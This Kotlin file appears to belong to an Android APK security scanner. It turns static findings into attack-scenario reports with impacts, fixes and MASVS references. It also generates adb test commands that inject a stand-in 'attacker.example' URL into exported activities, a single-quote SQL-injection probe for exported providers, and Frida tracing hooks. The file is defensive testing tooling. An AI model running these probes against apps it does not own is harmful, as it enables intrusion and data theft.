package dev.apkrelab

import dev.apkrelab.SecurityScanner.Finding
import dev.apkrelab.SecurityScanner.Severity

/**
 * 0.93.0: ATTACK SCENARIOS. A list of findings says what is wrong; a scenario says how an attacker would get from an entry point to an impact by chaining some of them, who that attacker is, how
 * likely the entry is, and how the owner can try it on his own build. Deterministic and rule-based (no model): four patterns, each needing the findings that make the chain real, so that a
 * WebView sink without a JavaScript bridge, or a bridge nobody can feed, is not a scenario. Static inference: nothing here was run.
 */
object AttackScenarios {

    class Scenario(
        val id: String, val title: String, val severity: Severity, val likelihood: String, val likelihoodWhy: String,
        val attacker: String, val entry: String, val chain: List<Finding>, val impact: String, val test: String, val fix: String, val masvs: List<String>, val frida: String = ""
    )

    private fun dotted(f: Finding): String = f.classType?.removePrefix("L")?.removeSuffix(";")?.replace('/', '.')?.substringBefore('$') ?: ""
    private fun appOwned(f: Finding) = f.scope != SecurityScanner.Scope.LIB

    /** The manifest component whose class is [cls] (an inner class belongs to its outer class). */
    private fun componentOf(mc: ManifestContext?, cls: String, pkg: String): ManifestComponent? {
        if (mc == null || cls.isEmpty()) return null
        return mc.components.firstOrNull { c ->
            val n = if (c.name.startsWith(".")) pkg + c.name else if (!c.name.contains('.')) "$pkg.${c.name}" else c.name
            n == cls
        }
    }

    /** "any app can start it": exported and not protected by a permission. */
    private fun open(c: ManifestComponent?) = c != null && c.exported && c.permission.isNullOrEmpty() && c.readPermission.isNullOrEmpty()

    private fun shortName(cls: String) = cls.substringAfterLast('.')


    /** The dangerous operations a taint flow can end in (WebView sinks have their own scenarios). */
    private class SinkKind(val key: String, val title: String, val impact: String, val fix: String, val masvs: List<String>, val hooks: List<Pair<String, String>>)
    private val sinkKinds = listOf(
        "shell command" to SinkKind("shell", "Another app can make the app run a shell command of its choosing",
            "The attacker's text becomes (part of) a command line run with the app's user id: it can read or overwrite everything the app owns, start processes and send data out.",
            "Never build a command from input: call the API you need directly, or pass a fixed program with an allow-listed argument list (ProcessBuilder with separate arguments, never sh -c).", listOf("MASVS-CODE-4"),
            listOf("java.lang.Runtime" to "exec", "java.lang.ProcessBuilder" to "start")),
        "SQL statement" to SinkKind("sql", "Another app can inject SQL into the app's database",
            "Input reaches an SQL statement: rows of any table of that database can be read, changed or deleted, including ones the screen never shows.",
            "Use selection arguments (?) or Room parameters for every value; allow-list table, column and ORDER BY names.", listOf("MASVS-CODE-4", "MASVS-STORAGE-2"),
            listOf("android.database.sqlite.SQLiteDatabase" to "rawQuery", "android.database.sqlite.SQLiteDatabase" to "execSQL")),
        "file path" to SinkKind("file", "Another app can choose which file the app reads or writes",
            "The attacker picks the path: with ../ it leaves the intended folder, so private files (tokens, databases) can be read, or files overwritten.",
            "Reduce the input to a bare file name, resolve it against a fixed directory, call canonicalFile and check it still starts with that directory.", listOf("MASVS-CODE-4", "MASVS-STORAGE-1"),
            listOf("java.io.File" to "\$init", "java.io.FileInputStream" to "\$init", "java.io.FileOutputStream" to "\$init")),
        "code or a native library" to SinkKind("code", "Another app can make the app load code of its choosing",
            "The attacker's path or name is loaded as a dex file or native library: that is code execution inside the app with all its permissions.",
            "Load code only from the app's own read-only locations (assets, a code cache the app created); never from a path or name given by a caller.", listOf("MASVS-CODE-4"),
            listOf("dalvik.system.DexClassLoader" to "\$init", "java.lang.System" to "load", "java.lang.System" to "loadLibrary")),
        "deserialized" to SinkKind("deser", "Another app can feed the app a serialized object of its choosing",
            "A crafted object stream can instantiate classes of the attacker's choice (gadget chains) and run code, or corrupt state.",
            "Do not deserialize data from a caller; use a data format (JSON with fixed types) or an ObjectInputFilter that allows only the expected classes.", listOf("MASVS-CODE-4"),
            listOf("java.io.ObjectInputStream" to "readObject")),
        "intent redirection" to SinkKind("redirect", "Another app can make the app launch a component of its choosing with the app's privileges",
            "The app starts an Intent it received: the attacker reaches components and content providers that are not exported, and the grant flags carry the app's URI permissions.",
            "Do not launch an Intent you received from a caller: build a new Intent for a fixed component of your own and copy over only the extras you validated.", listOf("MASVS-PLATFORM-1", "MASVS-CODE-4"),
            listOf("android.app.Activity" to "startActivity", "android.content.ContextWrapper" to "startActivity")),
        "class or method by name" to SinkKind("refl", "Another app can choose which class or method the app invokes",
            "The attacker names the class or method that reflection calls: any code reachable by name in the app (or its libraries) can be run with attacker data.",
            "Map a fixed set of identifiers to the classes you intend to call; never pass a name from outside to Class.forName or getMethod.", listOf("MASVS-CODE-4"),
            listOf("java.lang.Class" to "forName")),
        "chooses the server" to SinkKind("server", "Another app can choose the server the app talks to",
            "The attacker's URL receives the request: tokens and headers the app adds are sent to the attacker's server, or the response is attacker-controlled.",
            "Allow-list hosts (your own domains over https) before opening a connection; never take a base URL from a caller.", listOf("MASVS-NETWORK-1", "MASVS-CODE-4"),
            listOf("java.net.URL" to "openConnection")),
        "file or content URI" to SinkKind("uri", "Another app can make the app open a file or content URI of its choosing",
            "The app opens whatever URI it is given with its own permissions (a confused deputy): private files or other providers' data can be read and handed back.",
            "Accept only the URI schemes and authorities you expect, never file:// from a caller, and check the resolved path stays inside your own directories.", listOf("MASVS-PLATFORM-1", "MASVS-STORAGE-2"),
            listOf("android.content.ContentResolver" to "openInputStream", "android.content.ContentResolver" to "openFileDescriptor"))
    )
    private fun sinkKindOf(title: String): SinkKind? = sinkKinds.firstOrNull { title.contains(it.first, true) }?.second
    private val srcApiRe = Regex("Data from ([A-Za-z0-9_.$]+)\\(")
    private fun sourceClass(f: Finding): String = if (f.sourceMethod.isNotEmpty()) f.sourceMethod.substringBefore("->").removePrefix("L").removeSuffix(";").replace('/', '.').substringBefore('$') else dotted(f)
    private fun sourceMethodName(f: Finding): String? = if (f.sourceMethod.isNotEmpty()) f.sourceMethod.substringAfter("->").substringBefore("(") else sinkMethod(f)

    private val methodInDetail = Regex("in method ([A-Za-z0-9_$<>]+)\\(")
    private fun sinkMethod(f: Finding): String? = methodInDetail.find(f.detail)?.groupValues?.get(1)
    private val chainClassRe = Regex("([a-z][A-Za-z0-9_.]*\\.[A-Z][A-Za-z0-9_$]*)\\.[A-Za-z_<][A-Za-z0-9_$<>]*\\(\\)")
    private fun chainClasses(f: Finding): List<String> = chainClassRe.findAll(f.chain).map { it.groupValues[1] }.toList()

    /** Where the value a non-exported WebView activity receives comes from: [fixed] when every writer on the path puts a constant (the chain is not reachable from outside). */
    class Origin(val fixed: Boolean, val text: String)
    private fun originOf(sink: Finding, cls: String, method: String? = sinkMethod(sink)): Origin? {
        val reads = IntentExtras.readsOf(cls, method).filter { it.kind != "query" }
        if (reads.isEmpty()) return null
        val all = ArrayList<IntentExtras.Write>(); val parts = ArrayList<String>()
        for (r in reads) {
            val ws = IntentExtras.writesOf(r.key, chainClasses(sink))
            if (ws.isEmpty()) return null
            all.addAll(ws)
            parts.add(ws.joinToString(" / ") { shortName(it.classType.removePrefix("L").removeSuffix(";").replace('/', '.')) + "." + it.method + "() sets \"" + it.key + "\" from " + it.detail })
        }
        return Origin(all.all { it.origin == "CONSTANT" || it.origin == "RESOURCE" }, parts.joinToString("; "))
    }

    private fun extrasArgs(reads: List<IntentExtras.Read>): String {
        val a = reads.mapNotNull { r -> when (r.kind) {
            "String" -> "--es " + r.key + " \"https://attacker.example/\""; "Int" -> "--ei " + r.key + " 1"; "Boolean" -> "--ez " + r.key + " true"; "Long" -> "--el " + r.key + " 1"; else -> null } }
        return if (a.isEmpty()) "--es <extra-name-from-the-code> \"https://attacker.example/\"" else a.joinToString(" ")
    }

    private fun fridaFor(pkg: String, hooks: List<Pair<String, String>>): String {
        val h = hooks.distinct().filter { it.first.isNotEmpty() && it.second.isNotEmpty() }
        if (h.isEmpty()) return ""
        return "// frida -U -f $pkg -l hook.js   (your own debug build; prints each call with its arguments)\nJava.perform(function () {\n" +
            "  function trace(cls, name) { try { Java.use(cls)[name].overloads.forEach(function (o) { o.implementation = function () { console.log('[APKReLab] ' + cls + '.' + name + '(' + Array.prototype.slice.call(arguments).join(', ') + ')'); return o.apply(this, arguments); }; }); } catch (e) { console.log('[APKReLab] cannot hook ' + cls + '.' + name + ': ' + e); } }\n" +
            h.joinToString("\n") { "  trace('" + it.first + "', '" + it.second + "');" } + "\n});"
    }

    /** An adb line that starts the activity, with a deep link when the component declares one; the extra's name is in the code (the finding names the method). */
    private fun launchLine(c: ManifestComponent, pkg: String, cls: String, reads: List<IntentExtras.Read> = emptyList()): String {
        val plain = reads.filter { it.kind == "String" || it.kind == "Int" || it.kind == "Boolean" || it.kind == "Long" }
        val unsupported = reads.filter { it.kind == "Parcelable" || it.kind == "Serializable" || it.kind == "Bundle" }
        val data = Regex("<data\\s+([^>]*?)/?>").findAll(c.body).map { it.groupValues[1] }.firstOrNull { it.contains("android:scheme") }
        if (data != null) {
            val scheme = Regex("android:scheme\\s*=\\s*\"([^\"]+)\"").find(data)?.groupValues?.get(1)
            val host = Regex("android:host\\s*=\\s*\"([^\"]+)\"").find(data)?.groupValues?.get(1) ?: "example.org"
            // every query parameter the code reads (InjuredAndroid's RCE reads two), else the first String extra's name, else a placeholder
            val keys = reads.filter { it.kind == "query" }.map { it.key }.distinct().ifEmpty { listOfNotNull(reads.firstOrNull { it.kind == "String" }?.key) }.ifEmpty { listOf("url") }
            if (scheme != null) return "adb shell am start -a android.intent.action.VIEW -d \"$scheme://$host/?" + keys.joinToString("&") { "$it=https://attacker.example/" } + "\" $pkg"
        }
        val action = if (c.tag == "receiver") Regex("<action\\s+android:name\\s*=\\s*\"([^\"]+)\"").find(c.body)?.groupValues?.get(1) else null
        val tag = if (c.tag == "service") "startservice" else if (c.tag == "receiver") "broadcast" + (if (action != null) " -a $action" else "") else "start"
        // the extras are Parcelables / Serializables only: adb cannot build them, so no invented --es line
        if (plain.isEmpty() && unsupported.isNotEmpty())
            return "No adb line: the code reads " + unsupported.joinToString(", ") { it.key + " (" + it.kind + ")" } + ", which adb cannot build. Send it from a small test app, or use:  adb shell am $tag -n $pkg/$cls   to see how the component behaves without it."
        return "adb shell am $tag -n $pkg/$cls " + extrasArgs(plain) + (if (unsupported.isNotEmpty()) "     (also read, not settable with adb: " + unsupported.joinToString(", ") { it.key } + ")" else "")
    }

    fun build(findings: List<Finding>, mc: ManifestContext?, pkg: String, dropped: MutableList<String>? = null): List<Scenario> {
        val out = ArrayList<Scenario>()
        val live = findings.filter { it.severity.rank <= 3 }            // LOW and above: INFO never makes a scenario

        // ---- 1. attacker-chosen web content in a WebView that exposes native methods
        val sinks = live.filter { (it.ruleId == "taint-flow" || it.ruleId == "taint-xclass") && it.title.contains("WebView", true) && it.severity.rank <= 2 && appOwned(it) }
        val bridges = live.filter { (it.ruleId == "webview-js-interface" || it.ruleId == "webview-js-bridge-method") && appOwned(it) && it.severity.rank <= 2 }
        val bridgeMethodFindings = live.filter { it.ruleId == "webview-js-bridge-method" && it.severity.rank <= 2 }
        val reachRe = Regex("reach: ([A-Za-z0-9_$]+)\\(\\)")
        val bridgeMethods = bridgeMethodFindings.flatMap { f -> reachRe.findAll(f.detail).map { it.groupValues[1] to shortName(dotted(f)) }.toList() }.distinct()
        for (s in sinks.groupBy { dotted(it) }) {
            val sink = s.value.minByOrNull { it.severity.rank }!!
            // the bridge must be in the SAME class as the sink (an inner class counts): a bridge elsewhere in the app is not a chain (Markor: a preview WebView and an unrelated editor bridge)
            val sameClass = bridges.filter { dotted(it) == s.key }
            val chainBridges = sameClass
            if (chainBridges.isEmpty()) continue
            val comp = componentOf(mc, s.key, pkg)
            val direct = open(comp)
            val (lik, why0) = when {
                direct -> "HIGH" to "the activity is exported without a permission: any app (or a link) can start it with chosen extras"
                sink.reach == "YES" -> "MEDIUM" to "reached from an exported component through the app's own code (call path in the finding); the attacker must control the value upstream"
                sink.reach == "YES~" -> "MEDIUM" to "probably reached from an exported component (approximate class-level path); the attacker must control the value upstream"
                else -> "LOW" to "no path from an exported component was found"
            }
            val org = if (!direct) originOf(sink, s.key) else null
            if (org != null && org.fixed) { dropped?.add("the WebView URL in " + shortName(s.key) + ": " + org.text + " (a constant: not controllable from outside)"); continue }
            val why = if (org != null) why0 + ". " + org.text else why0
            val strongBridge = chainBridges.any { it.ruleId == "webview-js-bridge-method" }
            val sev = if (strongBridge || sameClass.isNotEmpty()) (if (sink.severity.rank <= 1) Severity.HIGH else Severity.MEDIUM) else Severity.MEDIUM
            if (lik == "LOW") continue                                   // a chain nobody can reach is a finding, not a scenario
            val entry = if (direct) "exported ${comp!!.tag} " + s.key else sink.chain.lineSequence().firstOrNull { it.startsWith("Entry:") }?.removePrefix("Entry:")?.trim() ?: "the WebView in " + s.key
            out.add(Scenario("webview-remote-content:" + s.key, "Attacker-chosen web content in a WebView that exposes native methods", sev, lik, why,
                "another app on the device, a link the user taps" + (if (!direct) ", or whoever controls the value the app passes on (a server response, an earlier screen)" else ""), entry,
                listOf(sink) + chainBridges,
                "The page the WebView loads is chosen by the attacker. It runs JavaScript in the app's WebView, can call the methods of the object the app bridges" +
                    (if (bridgeMethods.isNotEmpty()) " (JavaScript-exposed methods the scanner found in the app: " + bridgeMethods.take(4).joinToString(", ") { it.first + "() in " + it.second } + "; which of them this WebView bridges is not proven)" else "") +
                    ", and can show a fake login or payment form inside the app's own window.",
                if (direct) launchLine(comp!!, pkg, s.key, IntentExtras.readsOf(s.key, sinkMethod(sink)))
                else "Not directly startable. " + (if (org != null) "The value is set by: " + org.text + ". To test, make that value attacker-controlled on a debug build (the server response or the earlier screen's input)." else "Follow the call path in the finding on a debug build and change the value the activity receives."),
                "Allow-list the scheme and host before loadUrl (https and your own domains), map ids to fixed URLs, and replace addJavascriptInterface with WebViewCompat.addWebMessageListener restricted to your origins.",
                listOf("MASVS-PLATFORM-2", "MASVS-CODE-4"),
                frida = fridaFor(pkg, listOf(s.key to (sinkMethod(sink) ?: ""), "android.webkit.WebView" to "loadUrl") + bridgeMethods.take(4).map { it.second to it.first })))
        }

        // ---- 1b. an activity that any app can start, that loads an attacker-chosen URL and whose WebView lets local files be read from a web page
        val fileAccess = live.filter { it.ruleId == "webview-file-access" && appOwned(it) && it.severity.rank <= 1 }
        for (s in sinks.groupBy { dotted(it) }) {
            val comp = componentOf(mc, s.key, pkg)
            val sink = s.value.minByOrNull { it.severity.rank }!!
            val direct = open(comp) && comp!!.tag == "activity"
            val viaPath = !direct && (sink.reach == "YES" || sink.reach == "YES~")             // OVAA: an internal WebViewActivity reached through an exported deep-link activity
            if (!direct && !viaPath) continue
            val fa = fileAccess.filter { dotted(it) == s.key }
            if (fa.isEmpty() || out.any { it.id == "webview-remote-content:" + s.key }) continue
            val org = if (!direct) originOf(sink, s.key) else null
            if (org != null && org.fixed) { dropped?.add("the WebView URL in " + shortName(s.key) + ": " + org.text + " (a constant: not controllable from outside)"); continue }
            val entry = if (direct) "exported activity " + s.key else sink.chain.lineSequence().firstOrNull { it.startsWith("Entry:") }?.removePrefix("Entry:")?.trim() ?: "the app's exported entry (see the call path)"
            out.add(Scenario("webview-file-read:" + s.key, if (direct) "Any app can make an exported WebView activity open its own page with file access" else "An attacker-chosen page can reach a WebView that allows file access", Severity.HIGH,
                if (direct) "HIGH" else "MEDIUM",
                if (direct) "the activity is exported without a permission and loads the URL it is given" else "reached from an exported component through the app's own code (call path in the finding); the attacker must control the value upstream",
                "any app on the device, or a link the user taps", entry, listOf(sink) + fa.take(2),
                "A page chosen by the attacker is loaded with file-URL access switched on, so JavaScript in it can try to read files the app can read (its private data included) and send them out.",
                if (direct) launchLine(comp!!, pkg, s.key, IntentExtras.readsOf(s.key, sinkMethod(sink)))
                else "Not directly startable: start the exported entry named above with the data it forwards (see the call path in the finding) on a debug build." + (if (org != null) " The value is set by: " + org.text + "." else ""),
                "Do not export the activity (or require a signature permission); allow-list the URL; switch off setAllowFileAccessFromFileURLs and setAllowUniversalAccessFromFileURLs.",
                listOf("MASVS-PLATFORM-2", "MASVS-CODE-4"), frida = fridaFor(pkg, listOf(s.key to (sinkMethod(sink) ?: ""), "android.webkit.WebView" to "loadUrl"))))
        }

        // ---- 2. traffic interception: certificate validation switched off
        val mitm = live.filter { it.ruleId in setOf("tls-trustmanager", "tls-hostname-verifier", "tls-insecure-socket-factory", "webview-ssl-error") && appOwned(it) && it.severity.rank <= 1 }
        if (mitm.isNotEmpty()) {
            val clear = live.filter { it.ruleId in setOf("manifest-cleartext-traffic", "res-nsc-cleartext", "res-nsc-cleartext-domains", "res-nsc-user-ca") }
            val worst = mitm.minByOrNull { it.severity.rank }!!
            out.add(Scenario("traffic-interception", "Anyone on the network path can read and change the app's HTTPS traffic", worst.severity,
                if (worst.severity.rank == 0) "HIGH" else "MEDIUM", if (worst.severity.rank == 0) "the validation is disabled in code the app installs" else "the check is weakened, whether it is installed was not proven",
                "someone on the same Wi-Fi or on the route (a rogue hotspot, a compromised router), with no certificate installed on the phone", "any request the app makes through the affected client",
                mitm + clear.take(2),
                "Tokens, credentials and payment data the app sends or receives can be read and altered in transit; responses can be forged. This holds unless the payload is protected ABOVE TLS " +
                    "(end-to-end encrypted or signed messages, an onion-routing client talking to self-signed nodes): some apps switch validation off on purpose for that traffic, so check what the affected client carries.",
                "On a test phone route the traffic through mitmproxy WITHOUT installing its CA: if the app's requests still succeed, certificate validation is off.",
                "Remove the trust-all TrustManager / HostnameVerifier; keep the platform's validation, and pin your own endpoints (network_security_config pin-set or CertificatePinner).",
                listOf("MASVS-NETWORK-1", "MASVS-NETWORK-2"),
                frida = fridaFor(pkg, mitm.filter { it.ruleId == "tls-trustmanager" }.take(2).map { dotted(it) to "checkServerTrusted" })))
        }

        // ---- 3. data taken from the device through adb: debuggable build or backup, with secrets stored
        val dbg = live.firstOrNull { it.ruleId == "manifest-debuggable" }
        val bk = live.firstOrNull { it.ruleId == "manifest-allow-backup" }
        // DATA AT REST only: a secret hard-coded in the code is in the APK, which anyone can read; a backup or run-as does not add anything to it (Breezy: three JWTs in the code were a "backup" chain)
        val stored = live.filter { it.severity.rank <= 2 && appOwned(it) && it.ruleId in setOf("fintech-unencrypted-storage", "sqlite-unencrypted", "storage-file-mode", "external-storage") }
        if ((dbg != null || bk != null) && stored.isNotEmpty()) {
            val head = listOfNotNull(dbg, bk)
            val sev = if (dbg != null) Severity.HIGH else Severity.MEDIUM
            out.add(Scenario("local-data-extraction", if (dbg != null) "A debuggable build lets anyone with adb read the app's private data" else "App data can be copied off the device through a backup",
                sev, if (dbg != null) "HIGH" else "MEDIUM", if (dbg != null) "run-as works on a debuggable app without root" else "the platform honours allowBackup only in some configurations (older Android versions, or when the user allows it)",
                "someone with the unlocked phone and a USB cable, or malware with adb access", "adb", head + stored.take(3),
                "Files, databases and preferences of the app (" + stored.take(3).joinToString(", ") { it.title.take(48) } + ") are readable, so stored secrets and tokens are exposed.",
                if (dbg != null) "adb shell run-as $pkg ls files databases shared_prefs" else "adb backup -f app.ab $pkg   (then inspect the archive)",
                if (dbg != null) "Never ship android:debuggable=\"true\"; encrypt what you store (Keystore-backed keys, EncryptedSharedPreferences, SQLCipher with a Keystore key)." else "Set allowBackup=\"false\" or use dataExtractionRules to exclude sensitive files; encrypt stored secrets.",
                listOf("MASVS-STORAGE-1", "MASVS-STORAGE-2")))
        }

        // ---- 4. an exported content provider that leaks or can be injected
        for (f in live.filter { (it.ruleId == "provider-sql-injection" || it.ruleId == "provider-openfile-segment") && appOwned(it) }.groupBy { dotted(it) }) {
            val comp = componentOf(mc, f.key, pkg)
            if (!open(comp) || comp!!.tag != "provider") continue
            val auth = Regex("android:authorities\\s*=\\s*\"([^\"]+)\"").find(comp.headerAttrs)?.groupValues?.get(1)?.substringBefore(';') ?: "<authority>"
            val worst = f.value.minByOrNull { it.severity.rank }!!
            out.add(Scenario("provider-leak:" + f.key, "Any app can query or read files through the exported provider " + shortName(f.key), worst.severity, "HIGH",
                "the provider is exported without a permission: any installed app can call it", "any app installed on the device (no permission needed)", "content://$auth", f.value,
                if (worst.ruleId == "provider-sql-injection") "A crafted selection changes the SQL the provider runs, so rows the app never meant to share can be read." else "A crafted path segment can make the provider open files outside its intended folder.",
                "adb shell content query --uri content://$auth/      (a benign probe: it only shows whether the provider answers without a permission)",
                "Make the provider not exported, or protect it with a signature-level permission; use parameterized queries / a fixed set of columns; resolve file paths and check they stay inside the intended directory.",
                listOf("MASVS-PLATFORM-1", "MASVS-CODE-4")))
        }

        // ---- 5. an exported component (or a path from one) feeds attacker data to a dangerous operation; WebView sinks have patterns 1 / 1b
        val dangerous = live.filter { (it.ruleId == "taint-flow" || it.ruleId == "taint-xclass") && it.severity.rank <= 1 && appOwned(it) && !it.title.contains("WebView", true) && sinkKindOf(it.title) != null }
        for (g in dangerous.groupBy { sourceClass(it) + "|" + sinkKindOf(it.title)!!.key }) {
            val f0 = g.value.minByOrNull { it.severity.rank }!!
            val k = sinkKindOf(f0.title)!!
            val srcCls = sourceClass(f0); val srcMethod = sourceMethodName(f0)
            val comp = componentOf(mc, srcCls, pkg)
            val isProvider = comp != null && comp.tag == "provider"
            if (isProvider && out.any { it.id == "provider-leak:" + srcCls }) continue                       // pattern 4 already tells this provider's story
            val direct = open(comp) && !isProvider
            val directProvider = isProvider && open(comp)
            val viaPath = !direct && !directProvider && (f0.reach == "YES" || f0.reach == "YES~")
            if (!direct && !directProvider && !viaPath) continue
            val org = if (!direct) originOf(f0, srcCls, srcMethod) else null
            if (org != null && org.fixed) { dropped?.add("the " + k.key + " flow in " + shortName(srcCls) + ": " + org.text + " (a constant: not controllable from outside)"); continue }
            val srcApi = srcApiRe.find(f0.detail)?.groupValues?.get(1) ?: ""
            val intentBased = srcApi.startsWith("Intent.") || srcApi.contains("getQueryParameter") || srcApi.startsWith("Uri.")
            val reads = IntentExtras.readsOf(srcCls, srcMethod).ifEmpty { IntentExtras.readsOf(srcCls) }
            val auth = if (directProvider) (Regex("android:authorities\\s*=\\s*\"([^\"]+)\"").find(comp!!.headerAttrs)?.groupValues?.get(1)?.substringBefore(';') ?: "<authority>") else ""
            val entry = if (direct) "exported ${comp!!.tag} $srcCls" else if (directProvider) "content://$auth" else f0.chain.lineSequence().firstOrNull { it.startsWith("Entry:") }?.removePrefix("Entry:")?.trim() ?: ("the code in " + shortName(srcCls))
            val lik = if (direct || directProvider) "HIGH" else "MEDIUM"
            val why = if (directProvider) "the provider is exported without a permission: any installed app can call it"
                else if (direct) "the ${comp!!.tag} is exported without a permission: any app can start it with data of its choosing"
                else (if (f0.reach == "YES") "reached from an exported component through the app's own code (call path in the finding); the attacker must control the value upstream"
                      else "probably reached from an exported component (approximate class-level path); the attacker must control the value upstream") + (if (org != null) ". " + org.text else "")
            val test = when {
                directProvider -> "adb shell content query --uri content://$auth/" + (if (k.key == "sql") " --where \"'\"      (a single quote: a syntax error in the answer shows the input reaches the SQL)" else "      (a benign probe: it only shows whether the provider answers without a permission)")
                direct && intentBased -> launchLine(comp!!, pkg, srcCls, reads)
                direct -> "No adb line: the data enters through $srcApi, not an Intent extra. Call it from a small test app that binds / sends what the code reads."
                else -> "Not directly startable. Start the exported entry named above with the data it forwards (see the call path in the finding) on a debug build." + (if (org != null) " The value is set by: " + org.text + "." else "") +
                    (if (reads.isNotEmpty()) " The component reads: " + reads.joinToString(", ") { it.key + " (" + it.kind + ")" } + "." else "")
            }
            out.add(Scenario("exported-sink:" + k.key + ":" + srcCls, k.title, f0.severity, lik, why,
                "another app on the device" + (if (direct && comp!!.tag == "activity") ", or a link the user taps" else "") + (if (!direct) ", or whoever controls the value the app passes on (a server response, an earlier screen)" else ""),
                entry, g.value.distinctBy { it.title + it.location }.take(3), k.impact, test, k.fix, k.masvs,
                frida = fridaFor(pkg, listOf(srcCls to (srcMethod ?: "")) + k.hooks)))
        }

        return out.sortedWith(compareBy({ it.severity.rank }, { if (it.likelihood == "HIGH") 0 else if (it.likelihood == "MEDIUM") 1 else 2 })).take(10)
    }

    /** Markdown section; empty when there is no scenario (the report then says nothing rather than "none": absence of a chain here is not proof that there is none). */
    fun section(findings: List<Finding>, mc: ManifestContext?, pkg: String): String {
        val dropped = ArrayList<String>()
        val sc = try { build(findings, mc, pkg, dropped) } catch (_: Throwable) { return "" }
        if (sc.isEmpty() && dropped.isEmpty()) return ""
        val sb = StringBuilder("\n## Attack scenarios\n\n")
        sb.append("Chains of findings that describe how an attacker would get from an entry point to an impact, who the attacker is, how likely the entry is and how to try it on your own build. ")
            .append("This is static inference built from the findings above: nothing was run, and a scenario can only name chains made of findings the scanner has. No scenario here does not mean there is none.\n\n")
        for ((i, s) in sc.withIndex()) {
            sb.append("### ").append(i + 1).append(". [").append(s.severity.label).append("] ").append(s.title).append("\n\n")
            sb.append("- **Attacker:** ").append(s.attacker).append("\n- **Entry:** ").append(s.entry).append("\n- **Likelihood:** ").append(s.likelihood).append(" (").append(s.likelihoodWhy).append(")\n")
            sb.append("- **Chain:** ").append(s.chain.joinToString(" -> ") { "[" + it.severity.label + "] " + it.title.take(70) + " in " + shortName(it.location) }).append("\n")
            sb.append("- **Impact:** ").append(s.impact).append("\n- **Try it on your own build:** `").append(s.test.replace("`", "'")).append("`\n- **Fix:** ").append(s.fix).append("\n- **MASVS:** ").append(s.masvs.joinToString(", ")).append("\n")
            if (s.frida.isNotEmpty()) sb.append("- **Trace it at runtime (Frida, your own debug build):**\n\n```js\n").append(s.frida).append("\n```\n")
            sb.append("\n")
        }
        if (dropped.isNotEmpty()) sb.append("Not shown as scenarios (the value that reaches the sink is set by the app itself from a constant, so nobody outside controls it; the finding stays in the list):\n").append(dropped.joinToString("\n") { "- $it" }).append("\n")
        return sb.toString()
    }
}
